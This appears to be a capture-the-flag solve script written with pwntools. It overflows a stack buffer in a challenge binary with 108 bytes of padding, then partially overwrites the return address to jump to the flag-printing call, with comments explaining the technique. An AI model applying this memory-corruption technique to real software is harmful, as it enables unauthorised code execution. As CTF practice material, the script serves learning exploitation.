from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else: 
        return process([exe] + argv, *a, **kw)


exe = './chall'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
sh = start()

offset = b'A' * 108 # padding to reach local_c
# usage of 0xff:
# it leaves only the value in the last 8 bits, and ignores all the rest of the bits.
flagCall = (elf.sym['main']+23) & 0xff # main+23 the flag call is at +23
p = flat([
    offset,
    # use p8() because we want to control the RIP by changing the least significant bytes.
    p8(142), 
    p8(flagCall)
])

sh.sendlineafter(b'',p)
sh.interactive()
